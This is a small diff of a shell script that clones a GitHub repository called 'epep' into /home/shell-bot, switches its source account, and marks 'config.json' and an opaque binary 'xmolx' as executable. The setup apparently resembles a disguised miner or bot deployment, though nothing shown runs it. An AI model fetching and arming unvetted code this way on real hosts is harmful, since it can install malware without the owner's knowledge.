@@ -4,7 +4,7 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-git clone https://github.com/sitina21/epep.git
+git clone https://github.com/cahayaangkasaku1/epep.git
 cd epep
 chmod +x config.json
 chmod +x xmolx
